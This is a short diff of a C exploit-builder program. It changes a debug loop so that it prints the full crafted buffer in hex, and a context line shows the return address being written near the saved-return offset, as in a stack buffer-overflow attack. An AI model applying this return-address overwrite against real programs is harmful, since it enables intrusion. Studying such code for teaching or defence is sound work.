@@ -42,8 +42,8 @@ int main(int argc, char *argv[]) {
     *(unsigned int*)(buf + OFFSET_TO_RET - 4) = return_address;
 
     // Print the contents of the buffer (up to 100 bytes) to verify the exploit setup
-    printf("Buffer contents (first 100 bytes):\n");
-    for (int i = 0; i < 100; i++) {
+    printf("Buffer contents:\n");
+    for (int i = 0; i < sizeof(buf); i++) {
         printf("\\x%02x", (unsigned char)buf[i]);
         if ((i + 1) % 16 == 0) {
             printf("\n");
